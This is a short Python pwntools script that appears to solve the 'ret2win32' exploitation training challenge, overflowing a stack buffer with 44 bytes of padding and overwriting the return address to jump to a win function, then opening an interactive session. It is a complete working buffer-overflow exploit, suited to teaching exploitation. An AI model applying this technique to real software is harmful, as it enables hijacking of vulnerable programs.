from pwn import *

#elf = ELF('ret2win32')
p = process('./ret2win32')

junk = "A" * 44

#ret2win_addr = elf.symbols(['ret2win'])
ret2win_addr = 0x08048659

#print "ret2win addr = " + hex(ret2win_addr)

payload = junk + p32(ret2win_addr)

p.recvuntil('using fgets!')
p.sendline(payload)
p.interactive()

